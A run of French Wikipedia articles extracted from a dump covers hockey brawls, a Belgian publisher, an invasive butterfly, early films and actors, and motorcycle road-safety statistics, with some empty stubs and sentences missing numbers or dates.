Lors du championnat du monde junior de 1987, un combat géant explose lors d'un match entre le Canada et l'URSS. Alors que le Canada mène à 2, un combat général éclate entre les deux équipes (même les gardiens se mêlent à l'affrontement), combat qui durera , qui ne prendra même pas fin avec l'extinction des lumières décidée par les arbitres du match. Ce combat était une première pour les Soviétiques peu habitués aux combats sur une patinoire et donc aux limites tacites du hockey nord-américain. L'incident provoque la disqualification des deux équipes coûtant une médaille voire le titre de champion du monde au Canada au profit de la Finlande. Un livre de Gare Joyce fut inspiré de ce match.
Le mercredi 26 mars 1997, lors d'un match entre les Red Wings de Détroit et l'Avalanche du Colorado, pas moins de neuf combats éclatèrent entre les deux franchises. Les causes de l'incident remontent à la finale de l'association de l'Ouest de la saison précédente et d'une mise en échec de Claude Lemieux de l'Avalanche sur Kris Draper par derrière et en retard. Draper fut blessé et l'Avalanche gagna la Coupe Stanley. En mars 1997, une première escarmouche a lieu lors du premier tiers entre plusieurs joueurs de chaque franchise et Darren McCarty profita d'échapper à la vigilance d'un arbitre pour mettre un coup de poing sur le côté du visage de Lemieux qui ne regardait pas du tout dans cette direction. Une fois Lemieux à terre, McCarty continua à frapper sur la tête de Lemieux (qui tentait de se protéger avec ses mains) jusqu'à ce que les deux joueurs fussent séparés par les arbitres. L'événement commença alors à prendre de l'ampleur, Patrick Roy souhaitant venir prêter main-forte à son équipe reçut une mise en échec en pleine course de Brendan Shanahan.
Le 5 mars 2004, la rencontre opposant les Flyers de Philadelphie et les Sénateurs d'Ottawa atteint le total historique de de pénalités au cours du même match pour cinq bagarres générales et des combats entre joueurs peu habitués à se battre .
Coup du chapeau de Gordie Howe.
Dans la Ligue nationale de hockey, un coup du chapeau de Gordie Howe — en anglais « ' » — représente un tour du chapeau particulier. Il consiste à marquer un but, faire une passe décisive et participer à un combat. Même si cette « figure » porte le nom de Howe, connu à la fois pour ses combats mais également pour ses talents de buteur, Gordie Howe n'a jamais réussi qu'un seul de ces "hat trick" lors d'un soir de décembre 1955 contre les Bruins de Boston alors qu'il évoluait sous le maillot des Red Wings et Harry Cameron, joueur des St. Pats de Toronto, aurait été le premier joueur à réaliser un tel « ' » et ce en 1917. Brendan Shanahan a réussi le plus grand nombre de fois ce coup du chapeau avec dix-sept réalisations en carrière.

</doc>
<doc id="1873958" url="https://fr.wikipedia.org/wiki?curid=1873958" title="Musée du Docteur Faure">
Musée du Docteur Faure



</doc>
<doc id="1873959" url="https://fr.wikipedia.org/wiki?curid=1873959" title="Le Château des quatre obèses">
Le Château des quatre obèses

 
Le Château des quatre obèses est un film français réalisé par Yvan Noé et sorti en 1939.
Synopsis.
Dans un château, un soir d'orage, le docteur Carter et toute une joyeuse compagnie se retrouve accueilli par les quatre frères tenants des lieux. Les quatre obèses disparaissent un à un, sans laisser la moindre trace. L'inspecteur arrive et mène l'enquête.

</doc>
<doc id="1873962" url="https://fr.wikipedia.org/wiki?curid=1873962" title="Labor (éditions)">
Labor (éditions)



</doc>
<doc id="1873970" url="https://fr.wikipedia.org/wiki?curid=1873970" title="Éditions Labor">
Éditions Labor

Les Éditions Labor sont l'une des principales maisons d'édition de Belgique. Elles éditent aussi bien des ouvrages de fiction que de sciences humaines, ainsi que des livres scolaires et des beaux-livres.
Historique.
Fondées en 1919 par un député permanent socialiste hennuyer, Alexandre André, Labor s'est ensuite durablement installé à Bruxelles, pour revenir en 2005 à Charleroi, dans sa province d'origine.
Propriété des assurances La prévoyance sociale, elles-mêmes liées au mouvement socialiste, les Éditions Labor sont privatisées dans les années 1990. Elles se redéploient au début du , autour de la collection Espace Nord.
La société a été reprise en 2005 par les associés Jean-Marc Dubray et Michel Dryon. Martine Baurain est la directrice des ressources humaines.
En 2007, des difficultés financières amènent les éditions Labor à demander le concordat. Le , le tribunal de Charleroi divise le fonds de Labor en plusieurs lots : l'édition scolaire est vendue au groupe Averbode, la littérature à la société Tournesol Conseils (Luc Pire), la collection Divers est cédée aux Éditions Corporate Copyright (jugement du ) tandis que le fonds sciences humaines reste encore à attribuer.
Activités.
Dans les années 1980, le catalogue se répartit entre un important répertoire de sciences humaines (histoire, sciences politiques...) et des collections littéraires centrées sur des auteurs modernes ou des rééditions y compris en littérature de jeunesse.
La collection Espace Nord, qui à partir des années 1980, réédita les auteurs de la littérature belge francophone avec un apparat critique, et fut dirigée successivement par Jacques Dubois, Jean-Marie Klinkenberg et Daniel Blampain, devient rapidement le pivot des Éditions Labor. 
Jusqu'à sa liquidation en 2007, Labor était généralement reconnue comme la première maison belge en littérature, et la seconde toutes catégories confondues, se disputant généralement le haut du pavé avec Luc Pire, qui finira par reprendre son secteur littéraire. Ses deux collections littéraires, "Espace Nord" (poches) et "Grand Espace Nord" sont les plus riches du pays, et se sont agrandies par l'acquisition de l'ancienne maison historique belge Les Éperonniers, dont le fonds est devenu une collection. Une collection jeunesse ("Zone J") et policière ("Noir de Noir") sont également disponibles.
En matière de sciences-humaines, Labor dispose de collections "Histoire", "Sciences-politiques", "Pédagogie" (domaine de prédilection de Labor en raison de son implication dans l'édition scolaire pour la Communauté française de Belgique). La maison met en avant ses collections plus polémiques : "Liberté j'écris ton nom" (essais politiques régulièrement altermondialistes) et surtout "Quartier Libre", où l'on trouve des ouvrages de philosophes anarchistes (Bakounine, Reclus, ...) et une série de titres sous la direction de Michel Onfray.
Le positionnement de Labor dans l'édition en France est basé sur son fonds historique littéraire et surtout l'aspect irrévérencieux de ses collections en sciences-humaines (altermondialisme, anarchisme), thèmes souvent exploités par de petites maisons. Signe de sa présence en France : Labor était la seule maison belge à disposer de son propre stand lors du Salon du livre de Paris en 2006.
Labor a connu un succès éditorial à la fin de 2006 avec le livre "Bye-Bye Belgium" de Philippe Dutilleul consacré à l'émission "Tout ça (ne nous rendra pas la Belgique)".

</doc>
<doc id="1873971" url="https://fr.wikipedia.org/wiki?curid=1873971" title="Brun des pélargoniums">
Brun des pélargoniums

Le Brun des pélargoniums (Cacyreus marshalli) est une espèce de lépidoptères de la famille des Lycaenidae et de la sous-famille des Polyommatinae.
Originaire d'Afrique australe, cette espèce a été introduite en Europe occidentale à la fin du et y est devenue invasive.
Description.
Papillon.
L'imago du Brun des pélargoniums est un petit papillon d'une envergure de 15 à pour le mâle et de 18 à pour la femelle, au dessus marron bordé d'une frange blanche entrecoupée de marron, avec aux ailes postérieures une queue et un petit ocelle en position anale.
Le revers présente des dessins en lignes dans divers tons de marron, certains très colorés, et la même frange blanche entrecoupée de marron.
Les seules espèces ressemblantes en Europe sont "Lampides boeticus" et "Leptotes pirithous" (pour la présence des deux petites queues).
Chenille.
Les chenilles, d'abord de couleur vert tendre, changent de coloration, portent des marques roses formant des lignes sur le dos et des poils raides de couleur blanche, ce qui fait qu’on les confond avec les boutons floraux dans lesquels elles pénètrent (phénomène de mimétisme cryptique).
Biologie.
Phénologie.
Aux îles Baléares, on compte jusqu'à six générations du brun des pélargoniums par an.
En élevage, le cycle biologique dure en France autour d'un mois. Dans les Bouches-du-Rhône, l'adulte peut être observé dès le mois de janvier et jusqu'en mi-octobre en Charente.
Plantes hôtes.
La plante-hôte de sa chenille sont les "Pelargonium" et dit-on, les "Geranium", "Geranium sylvaticum", "Geranium pratense", "Geranium pyrenaicum", "Geranium robertianum". Mais des travaux de l'INRA montreraient que les "Geranium" indigènes ne seraient pas plantes-hôtes et que seuls les "Pelargonium" seraient concernés.
Écologie et distribution.
Le Brun des pélargoniums est présent dans le sud de l'Afrique (Afrique du Sud, Mozambique, Zimbabwe), et a été introduit aux Baléares puis s'est étendu au Maroc, à l'Espagne, à la France, l'Italie et en Belgique. Il est également repéré en Suisse (Tessin notamment, mais aussi canton de Genève et quelques mentions plus septentrionales) et en Autriche.
L'espèce étant originaire d'Afrique du Sud, des stades immatures sont, selon toute vraisemblance, introduits accidentellement aux Baléares par transport avec des “géraniums” ("Pelargonium"). Observée à Majorque en 1988, l'espèce envahit rapidement l'île, puis le reste des Baléares, débordant sur l'Espagne continentale. Dès 1991, un brun des pélargoniums est capturé à Bruxelles. En 1996, des colonies sont repérées près de Rome. En 1997, l'espèce, déjà présente en Catalogne, au Portugal et au Maroc, est observée pour la première fois en France dans les Pyrénées-Orientales, ainsi qu'en Grande-Bretagne (Sussex). Elle s'établit dans la plupart des départements français au cours des deux décennies suivantes.
L'expansion du Brun des pélargoniums, soutenue par le goût des habitants des villes et des villages pour le « géranium » et l'absence de parasites et prédateurs spécifiques, n'a pas été freinée dans les dernières années par sa relative disparition des balcons, du fait des ravages causés par les chenilles de l'espèce qui se nourrissent de toutes les parties aériennes de la plante, notamment des fleurs et des bourgeons floraux. Il semblerait donc que son établissement en France, au moins dans les régions méditerranéennes, soit à présent réalisé. Pour certains, le réchauffement climatique favoriserait cette expansion.
Biotopes.
Il réside dans les jardins et tous les lieux où sa plante-hôte est cultivée : parcs, balcons et autres.
Systématique.
L'espèce "Cacyreus marshalli" a été décrite par le zoologiste britannique Arthur Gardiner Butler en 1898.
Statut légal.
Dans les régions où elle a été introduite, l'espèce peut être nuisible aux pélargoniums ornementaux.
En France, un arrêté ministériel la place dans la liste des organismes contre lesquels la lutte est obligatoire de façon permanente à La Réunion, et obligatoire sous certaines conditions en France métropolitaine.

</doc>
<doc id="1873973" url="https://fr.wikipedia.org/wiki?curid=1873973" title="Les Frères corses (film, 1917)">
Les Frères corses (film, 1917)

Les Frères corses est un film muet français réalisé par André Antoine, tourné en 1915 et et sorti en 1917.
Il s'agit d'une adaptation du roman éponyme d'Alexandre Dumas père publié en 1844 et adapté au théâtre en 1850.
Synopsis.
Le film conte une histoire corse de vendetta, se déroulant dans les années 1840, d'après le roman éponyme d'Alexandre Dumas père. L'histoire est racontée dans ce film par un acteur incarnant Alexandre Dumas père.
Critiques.
Le scénario est ingrat au possible, les acteurs sont empoisonnés de théâtre et même de conservatoire et enfin le mot "économie" a dû être soufflé plus d'une fois à Antoine. Oui. Eh ! bien, "Les Frères Corses", c'est le plus beau film qu'on ait jamais vu en France ! Et il est français. Pour une fois ! (Louis Delluc) 

</doc>
<doc id="1873975" url="https://fr.wikipedia.org/wiki?curid=1873975" title="René Noël">
René Noël

René Noël, né le à Hornu et décédé le à Mons, est un homme politique belge communiste et militant wallon.
Biographie.
Fils d’un carreleur et d’une ménagère, René Noël est diplômé en 1927 d’un régendat en mathématiques. Enseignant et syndicaliste dès les années 30, il s'engage durant la guerre 1940-1945 au sein du mouvement de résistance impulsé par le parti communiste : le Front de l'Indépendance. En 1943, responsable au sein de ce mouvement de la presse clandestine pour le Brabant, il est l'un des principaux réalisateurs du "Faux Soir". 
Après la guerre, il milite au parti communiste. . Il obtient 21,5 % des voix aux élections de la fusion expérimentale des communes à Mons en 1970, puis (les élections ayant été annulées), près de 28 % en .
Et cela après l'appel au rassemblement lancé par le président du PSB et bourgmestre de Mons, Léo Collard le . Collard présente cependant une liste distincte de l'UDP à Mons, la liste du PSB national qui garde malgré tout un léger avantage sur l'UDP.
René Noël parvient à réunir un certain nombre d'années toutes les familles de la gauche, à la fois les communistes, les chrétiens et les socialistes, s'ouvrant même, au-delà de l'expérience locale de Cuesmes puis de Mons, à des éléments de partis autonomistes wallons avec la création de l'UDPW. Il participe au Congrès national wallon de Liège en 1945.
Il est plusieurs fois élu comme échevin, bourgmestre et sénateur.
Anecdote.
Lors de la fermeture du charbonnage l’Héribus, c'est René Noël qui demanda le transfert sur la place de Cuesmes, de la lampe de mineur géante qui se trouvait dans la cour du charbonnage.

</doc>
<doc id="1873976" url="https://fr.wikipedia.org/wiki?curid=1873976" title="Équipe d'Aragon de football">
Équipe d'Aragon de football

L'équipe d'Aragon de football est une sélection régionale de football espagnole. Cette sélection n'est donc affiliée ni à la FIFA, ni à l'UEFA, ni au NF-Board. L'équipe ne participe donc pas aux grandes compétitions internationales, mais peut jouer des matchs amicaux. Elle a récemment battu le Chili 1 à 0 à Saragosse le .

</doc>
<doc id="1873977" url="https://fr.wikipedia.org/wiki?curid=1873977" title="La danse du feu">
La danse du feu



</doc>
<doc id="1873979" url="https://fr.wikipedia.org/wiki?curid=1873979" title="Deir el-Medina">
Deir el-Medina



</doc>
<doc id="1873980" url="https://fr.wikipedia.org/wiki?curid=1873980" title="GDS">
GDS

GDS est un sigle à trois lettres qui peut signifier :

</doc>
<doc id="1873982" url="https://fr.wikipedia.org/wiki?curid=1873982" title="Global Distribution System">
Global Distribution System



</doc>
<doc id="1873983" url="https://fr.wikipedia.org/wiki?curid=1873983" title="Coracidium">
Coracidium



</doc>
<doc id="1873986" url="https://fr.wikipedia.org/wiki?curid=1873986" title="Échelles de la Mort">
Échelles de la Mort

Les Échelles de la Mort sont trois échelles autrefois en bois, maintenant réaménagées en structures métalliques, fixées dans les gorges sauvages du Doubs.
Histoire.
Situées à la frontière entre la France et la Suisse, sur la commune de Charquemont, ces échelles étaient utilisées par les contrebandiers pour franchir les falaises et ainsi pénétrer en Suisse. 
Par la suite, les forgerons Louvet de Maiche et de Charquemont (en particulier Louis), ont fabriqué et fixé dans la roche des échelles métalliques, offrant aujourd'hui un parcours de randonnée fort prisé.
Le canyon dans lequel ces échelles se dressent a également pris le nom de canyon des Échelles de la Mort.
Accès.
Les échelles et la via ferrata sont accessibles depuis le parking de la centrale du Refrain : il faut prendre le chemin à gauche dans le virage en épingle à cheveux sur la route D464 qui descend de Fournet-Blancheroche au lac de Biaufond.
Protection - Tourisme.
Les échelles et rochers de la mort font partie des sites inscrits du Doubs par la DREAL.

</doc>
<doc id="1873987" url="https://fr.wikipedia.org/wiki?curid=1873987" title="Frédéric Lewino">
Frédéric Lewino

Frédéric Lewino est un journaliste et écrivain français.
Il est grand reporter à l'hebdomadaire "Le Point" où il est spécialisé dans les questions d'environnement et de sciences.
En 2014, Pierre Haski ainsi que "Les Inrockuptibles" écornent ses que dénotent certains de ses articles publiés dans "Le Point".

</doc>
<doc id="1873989" url="https://fr.wikipedia.org/wiki?curid=1873989" title="Au Pays du Tararanni">
Au Pays du Tararanni



</doc>
<doc id="1873993" url="https://fr.wikipedia.org/wiki?curid=1873993" title="Taoufik Baccar">
Taoufik Baccar

Taoufik Baccar (), né le à Chenini, est un économiste et homme politique tunisien.
Biographie.
Titulaire d'une maîtrise en sciences économiques en 1972 et d'un diplôme de l'École nationale d'administration, il est nommé, en 1986, directeur général des ressources humaines au ministère du Plan et des Finances. En 1988, il est nommé au poste de directeur de l'Office de la formation professionnelle et de l'emploi pour une période de deux ans. En 1992, il est gouverneur suppléant aux assemblées annuelles de la Banque mondiale puis président de l'Agence arabe pour l'investissement et le développement agricole.
En 1995, il entre au gouvernement comme ministre du Développement économique puis dirige le ministère des Finances à partir d'avril 1999. En janvier 2004, il succède à à la tête de la Banque centrale de Tunisie pour un mandat de six ans ; il est reconduit dans ses fonctions le mais remercié un an plus tard, le , à la suite de la révolution tunisienne qui a chassé le président Zine el-Abidine Ben Ali.
Membre du comité central du Rassemblement constitutionnel démocratique jusqu'en 2011, il est également membre de plusieurs think tank et président du Centre international Hédi Nouira de prospective et d'études.
En 2018, il écrit "Le miroir et l'horizon, rêver la Tunisie", un livre dans lequel il revient sur les événements révolutionnaires du 14 janvier 2011. En 2020, il est nommé conseiller économique et financier auprès du chef du gouvernement Hichem Mechichi.

</doc>
<doc id="1873995" url="https://fr.wikipedia.org/wiki?curid=1873995" title="Sig Ruman">
Sig Ruman

Sig Ruman est un acteur germano-américain, né le à Hambourg et mort le à Julian (comté de San Diego, Californie). À Hollywood, il s'était fait une sorte de spécialité des rôles d'Allemands antipathiques.
Biographie.
Il étudia l’électrotechnique, mais se détourna de cette spécialité pour se produire comme acteur de music-hall. Il servit dans l'armée allemande pendant la Grande guerre. Il reprit sa carrière artistique mais, faute de travail, émigra aux États-Unis en 1924. Il se lia d'amitié avec le dramaturge George S. Kaufman et le critique de théâtre Alexander Woollcott, et remporta de nombreux succès à Broadway.
Ruman faits ses débuts à l'écran avec "Lucky Boy" (1929). Remarqué des Marx Brothers, on le voit apparaître successivement dans "Une nuit à l'opéra ", "Un jour aux courses" et "Une nuit à Casablanca". Son accent allemand et sa haute taille lui valent une multitude de rôles de méchants dans les thrillers et les films de guerre des années 1940 ; mais Ernst Lubitsch, autre compatriote émigré, lui propose des rôles plus légers : ainsi dans "Ninotchka" (1939) (où il interprète un bureaucrate soviétique) et "Jeux dangereux" (1942). Il interprète aussi le rôle du Pr. Herman von Reiter dans "Shining Victory" (1941), adaptation d'une pièce d'A. J. Cronin. Ruman jouera très souvent des rôles d'Allemands collet monté dans les films de Billy Wilder : "La Valse de l'empereur " (1948), "Stalag 17" (1953), "Un, deux, trois" (1961) et "La Grande Combine" (1966).
Vers 1936, il anglicise son nom d'artiste de Siegfried Ruman en Sig Ruman, compte-tenu de la montée de la germanophobie à Hollywood.
Malgré une santé chancelante, Ruman continue de se produire tout au long des années 1950 et 1960 dans une série de films, et est fréquemment invité sur les plateaux de télévision.
Il succombe le à un infarctus, juste devant sa maison de Julian (Californie), laissant veuve sa femme Else, en charge d'une fille, Senta.

</doc>
<doc id="1873999" url="https://fr.wikipedia.org/wiki?curid=1873999" title="Alexander Granach">
Alexander Granach

Alexander Granach est un célèbre acteur austro-hongrois né le dans l'oblast d'Ivano-Frankivsk en Ukraine et mort le à New York aux États-Unis.
Il est proche du courant libertaire
Biographie.
Alexander Granach, (de son vrai nom Jessaja Granach), né de parents juifs, développa son sens théâtral au célèbre Volksbühne de Berlin. Son premier succès cinématographique fut le rôle de Knock, le célèbre homologue de Renfield, dans le film "Nosferatu le vampire" sorti en 1922. Il fut ainsi à l'affiche de plusieurs grands classiques allemands à l'apparition du cinéma sonore, dont "La Tragédie de la mine" (1931).
Avec la montée au pouvoir du nazisme en Allemagne, il s'installa à Hollywood où il fit sa première apparition dans le film de Ernst Lubitsch "Ninotchka" (1939), dans lequel il interprète le rôle de Kopalski. Durant la Seconde Guerre mondiale, il fut amené à jouer différents rôles à succès, aussi bien comme nazi (il joua Julius Streicher dans "Hitler et sa clique") que comme fervent anti-fasciste.
Alexander Granach mourut le d'une embolie pulmonaire à la suite d'une appendicectomie.
Alexander Granach a laissé sa biographie, "Ot Geyt a Mentsh" ("Voici le chemin d'un homme", YKUF, New York, 1948) dont le manuscrit allemand a été traduit en yiddish par Yakov Mestl.

</doc>
<doc id="1874000" url="https://fr.wikipedia.org/wiki?curid=1874000" title="Estée Lauder (femme d'affaires)">
Estée Lauder (femme d'affaires)



</doc>
<doc id="1874001" url="https://fr.wikipedia.org/wiki?curid=1874001" title="Unité (chiffre)">
Unité (chiffre)

En arithmétique, on appelle unité, ou chiffre des unités, le chiffre le plus à droite de la partie entière d'un entier naturel, en base dix sauf précision contraire.
Exemple : le chiffre des unités du nombre est 7 (le chiffre des dizaines est 4, celui des centaines 2, etc.) ; le chiffre des unités de 2 est 2.
Propriétés générales.
Notons "u"("n") le nombre correspondant au chiffre des unités de l'entier "n". Il est caractérisé par :
Propriété liée à la base dix.
Pour tous entiers naturels "n" et "k", "u"("n") = "u"("n").
En effet, "n" est congru à "n" mod 10 puisqu'il l'est mod 2 et mod 5 :
Il existe une généralisation en base "b" si "b" est un produit de nombres premiers distincts.

</doc>
<doc id="1874003" url="https://fr.wikipedia.org/wiki?curid=1874003" title="Plérocercoïde">
Plérocercoïde

Le mot Plérocercoide se réfère aux formes matures des stades infectieux de certains parasites "pseudophyllidea" tels que "Diphyllobothrium latum".
La larve plérocercoïde des cestodes fait suite à la larve procercoïde.
&lt;br&gt;Elle est de forme allongée et est la forme pathogène de la larve.

</doc>
<doc id="1874006" url="https://fr.wikipedia.org/wiki?curid=1874006" title="Larve plérocercoïde">
Larve plérocercoïde



</doc>
<doc id="1874008" url="https://fr.wikipedia.org/wiki?curid=1874008" title="Sécurité des deux-roues motorisés">
Sécurité des deux-roues motorisés

La sécurité des deux-roues motorisés est l’étude des risques et des dangers concernant leurs utilisateurs (motards, scootéristes et cyclomotoristes), et en particulier les accidents de la circulation, et des approches pour atténuer ce risque, en mettant l’accent sur la conception du deux-roues (élément de sécurité sur une moto), la conception des routes et les règles de circulation, la formation des motards et les attitudes culturelles des motocyclistes et des autres usagers de la route. Pour les deux-roues non motorisés y compris les vélos à assistance électrique, on parle d'accident de vélo et de sécurité à vélo.
La conduite des deux-roues motorisés est marquée par un risque de mortalité supérieur à l'usage d'autres véhicules. Ce risque supérieur est lié aux caractéristiques d'une moto (par conception) et aux comportements de leurs conducteurs, ainsi que par une trop faible considération accordée aux particularités de ce mode de déplacement. Sa réduction passe par des actions de , un respect des règles (du code de la route ou bien de prudence), la conception, la qualité et la maintenance des réseaux routiers ainsi qu'une meilleure prise en compte des interactions entre les différentes catégories d'usagers de la route.
Enjeu.
En Europe, les définitions légales permettent aux deux-roues motorisés d'avoir deux ou trois roues.
En 2018, l'Union européenne compte de motos. La vulnérabilité des motards est énorme : 3500 motards sont tués sur les routes européennes en 2019.
En 2022, dans l'Union européenne, 3338 personnes sont tuées en moto, contre 546 en scooter. Plus de 9 sur 10 sont des hommes. La proportion d'hommes et de femmes varie selon le type de 2RM (moto ou scooter) et le pays: Pour les scooters de 76% en Belgique à 100% en Roumanie; pour les motos de 81% en Finlande à 100% au Danemark, en Irlande, en Lituanie, en Slovénie, en Slovaquie et en Suède.
À l'échelle mondiale, environ 30 % des tués sur la route impliquent des véhicules deux roues motorisés (2RM) y compris électriques.
Dans la région d'Asie du Sud-Est de l'OMS, les 2RM représentent 43 % des tués, mais ce taux est de 73 % et 74 % en Thailande et au Cambodge en 2016. Les jeunes adultes de 15 à comptent pour 60 % des tués dans les pays à faible et moyen revenus.
Des facteurs de risques de blessure sont connus : non-port du casque, vitesse, alcool, conditions de trafic mixte, manque de protection du véhicule dans l'accident, et manque d'infrastructure sécuritaire pour les 2RM.
Statistiques d'accidents.
Accidents en France.
En France, les statistiques différencient généralement cyclomoteurs (cylindrée de moins de ) et motos, la première catégorie ne représentant désormais qu'une très faible part des véhicules. Concernant les motos, l'Observatoire national interministériel de la sécurité routière (ONISR) indique à l'occasion de son bilan de l', que la mortalité pour ces véhicules est en régression lente depuis les . Ramenée à une base de dix mille motos, la mortalité a été divisée par 2,9 entre 1970 et 2010 alors qu'en absolu elle a été multipliée par 2,3.
Dans les années 2010, la mortalité pour les motos a baissé plus faiblement que pour les autres véhicules ; elle augmente même depuis quelques années. L'ensemble des deux-roues motorisés représentent ainsi 23 % des décès en 2017. Ramené à une distance parcourue d'un kilomètre, le risque d'être tué pour un conducteur de cyclomoteur est plus élevé que pour un automobiliste, ce chiffre grimpant à pour un conducteur de moto.
En 2022, les usagers de véhicules à deux roues motorisés représentent 22 % des tués sur la route, avec 594 motocyclistes et 124 cyclomotoristes décédés en 2022.
Le nombre de blessés graves classés M.AIS3+ est estimé à 5 300 soit 34 % des M.AIS3+ tous usagers convaincus, sur l'échelle des "" (AIS). Les usagers des deux roues motorisés représentent 39 % des usagers qui ont encore des séquelles une année après l’accident.
En 2024, les usagers de véhicules à deux roues motorisés représentent 5063 blessés MAIS3+ estimés, contre 4849 pour les véhicule de tourisme.
Dans les Alpes de Haute Provence et Hautes Alpes, une partie des accidents survient en groupes de 2RM expérimentées. Diverses pistes existent: les comportements (vitesse réduite sur courbes restreinte et par faible visibilité, freinage délicat sur l'angle, trajectoire extérieure, en quinconce, stages trajectoires, planification d'itinéraires), les infrastructures (courbes, visibilité restreintes, cailloux et pierres, balisage des virages difficiles, marquage axial) ainsi que la communication.
Outre-mer, en 2024, 83 personnes sont tuées en 2RM, contre 94 en véhicule de tourisme et 46 en marche.
Accidents en Belgique.
En Wallonie, les accidents de moto sont deux fois plus mortels qu'en Flandres.
Accidents au Royaume-Uni.
Au Royaume-Uni, la majorité du trafic et des accidents en deux-roues motorisés se produit en zone urbaine, mais les deux-tiers des tués le sont en zone rurale.
Accidents au Mexique.
Au Mexique, 23% des tués sur la route sont des motocyclistes. Les motocyclistes constituent également 23% des 1,4 million de personnes qui ont subi un accident de la route non mortel dans le pays.
Accidents dans l'Union européenne.
Dans l'Union européenne, la mortalité des deux-roues motorisés a diminué entre 2005 et 2014.
Les États membres qui comptent le plus de tués en moto, en 2023, sont par ordre décroissant l'Italie, la France, l'Allemagne, l'Espagne, et la Pologne alors que quatre de ces cinq pays représentent les plus grands marchés de motorcycle de l'Union européenne.
Dans l'Union européenne, trois accidents sur dix n'impliquent aucun tiers (accident en solo).
Statistiques des lésions.
Les lésions peuvent être classées en deux groupes :
Le décès peut être provoqué par une lésion du crâne, du thorax, de l’abdomen ou éventuellement de la colonne vertébrale. Il peut aussi être provoqué par plusieurs lésions simultanées (polytraumatisme).
En cas de survie, deux tiers des accidentés sont blessés aux membres inférieurs, la moitié aux membres supérieurs.
D'autres parties du corps peuvent également être touchées: crâne et face (18,5%), surface cutanée (10%), thorax (9%), colonne vertébrale (7%), abdomen (5,5%) et cou (4%).
Vulnérabilité.
La vulnérabilité des conducteurs de deux-roues s'explique en partie: les occupants n’ont pas de carrosserie pour les protéger; les lésions qui résultent de l'absence de carrosserie provoquent des traumatismes (fractures, contusions) mais aussi des dermabrasions, des brûlures et des risques d'infection (septicémie) en cas de contact de la peau avec la route. Les occupants peuvent utiliser une combinaison, pour limiter les risques de brûlures.
Le Centre européen d'études de sécurité et d'analyse des risques (CEESAR) a mené ses recherches dans les domaines de la biométrie et de la physiologie de la conduite, le système routier en général et ses infrastructures et a élaboré des scénarios types d'accidents. Ce centre émet des propositions d'améliorations des équipements de protection mais aussi des normes liées, y compris celles servant à l'homologation des casques ; certains tests en effet mériteraient des modifications pour pleinement juger de leur efficacité. Il propose également des mesures de formation des conducteurs de deux-roues motorisés, mais aussi un renforcement des sanctions à leur encontre.
Des infrastructures inadaptées et les conducteurs adoptant une conduite en moyenne plus risquée que les autres usagers de la route expliquent le danger de ce mode de déplacement.
Pour ces raisons, les autorités considèrent les motards comme des usagers vulnérables ("vulnerable road user" en anglais).
Principales causes d'accident.
Les causes d'accident sont nombreuses et présentées ici dans un ordre qui ne présume pas de leur importance relative. Certaines sont communes à toutes les catégories de véhicules, tandis que d'autres sont spécifiques aux deux-roues motorisés. Différentes études ont été menées pour identifier les particularités des accidents des 2RM, parmi lesquelles MAIDS (acronyme de "Motorcycle Accident In-Depth Study" ou « Étude approfondie sur les accidents en motocycle » en français), dont la dernière version est publiée en 2009, et qui est la plus importante pour l'Europe.
L'Association des constructeurs européens de motocycles (ACEM) en est à l'origine. Ses objectifs sont d'identifier, dans cinq zones témoins prédéfinies, les causes et les conséquences des accidents des deux-roues motorisés. sont très finement analysés (reconstitution des accidents, interrogation des témoins, inspection des véhicules, accès à certaines données médicales des conducteurs) permettant d'identifier près de deux mille variables. Si la méthodologie de cette étude permet d'identifier très finement les causes et conséquences de ces accidents, elle n'a pas vocation à mesurer l'importance relative de ces éléments pour le continent européen, les accidents retenus ne formant pas un échantillon représentatif.
Par exemple, en 2017 et pour la France, 32 % des cyclomotoristes et 39 % des motocyclistes se tuent dans des accidents n'impliquant aucun autre véhicule, alors que MAIDS ne retient que 15 % d'accidents « solo », soit un pourcentage encore plus faible d'accidents mortels. Les études nationales françaises s'appuient sur les fichiers BAAC (Bulletin d'analyse des accidents corporels) qui recensent tous les accidents corporels connus des forces de l'ordre, et sont donc statistiquement beaucoup plus précises, même si ces fichiers sont critiqués par diverses associations dont la Fédération française des motards en colère (FFMC), car ils ne permettent pas une analyse très précise des circonstances d'un accident de 2RM en raison de leur structure.
Causes d'accident en Belgique.
En Belgique, en 2009 et 2010 les accidents sans tiers (accident en solo) sont causés par une erreur d’exécution de la part du motard: perte de contrôle ou dérapage en freinant. La moitié de ces accidents se produisent dans un virage.
Les accidents avec un autre véhicule peuvent être dus à la non perception du motard par l'autre véhicule et aussi par la non compréhension du mouvement de l'autre véhicule par le motard&lt;ref name="D/2013/0779/15"&gt;Martensen, H. &amp; Roynard, M. (2013). MOTAC – Motorcycle accident causation. Analyse approfondie des accidents graves et mortels impliquant des motocyclistes. Bruxelles, Belgique : Institut Belge pour la Sécurité Routière – Centre de Connaissance Sécurité Routière
https://www.vias.be/publications/MOTAC%20%E2%80%93%20Motorcycle%20accident%20causation%20(2)/MOTAC%20%E2%80%93%20Motorcycle%20accident%20causation%20-%20Analyse%20approfondie%20des%20accidents%20graves%20et%20mortels%20impliquant%20des%20motocyclistes.pdf&lt;/ref&gt;.
En 2009 et 2010, les principales causes d'accidents en Belgique sont les suivantes:
Le cas où l'autre usager ne détecte pas la moto s'explique comme suit:
Danemark.
Au Danemark, 17 % des collisions mortelles ou incapacitantes en scooter impliquent des véhicules traffiqués.
Pays-Bas.
Pour 8 à 14 % des scooters « lents », la pauvre qualité des pneumatiques et des freins est un facteur d'accident.
Causes d'accident en France.
En France, 4 % de la mortalité routière concerne les cyclomotoristes () et 19 % les motocyclistes ().
Cause d'accident des cyclomotoristes (&lt;50 cm3) en France.
Nuit.
61 % des cyclomotoristes sont tués de nuit.
Alcoolémie.
37 % des conducteurs de cyclomoteurs impliqués dans un accident mortel ont un taux d’alcoolémie supérieur à 0,5 g/l.
Cause d'accident des motocyclistes () en France.
En France, les deux roues motorisés sont plus sensibles aux courbes et intersections que les autres véhicules motorisés.
En agglomération, dans les accidents mortels, la part de conducteurs de motocyclette alcoolisés est de 32 %.
Courbes.
Quand l’information relative au tracé est connue, les motocyclistes décèdent plus souvent en courbe que les autres usagers (40 % des cas contre 30 %). C’est encore plus marqué sur les routes hors agglomération (48 % des décès ont lieu en courbe)»
Intersections.
D'après l'ONISR, .
Vitesse.
La vitesse est comme une cause importante de mortalité pour les usagers de deux-roues motorisés, voire la première. Toutefois, ce sujet est sensible parmi les usagers de ce mode de transport. En particulier, cette compréhension du risque est critiquée par la Fédération française des motards en colère qui considère que la vitesse aggrave l'accident, sans en être une cause classique.
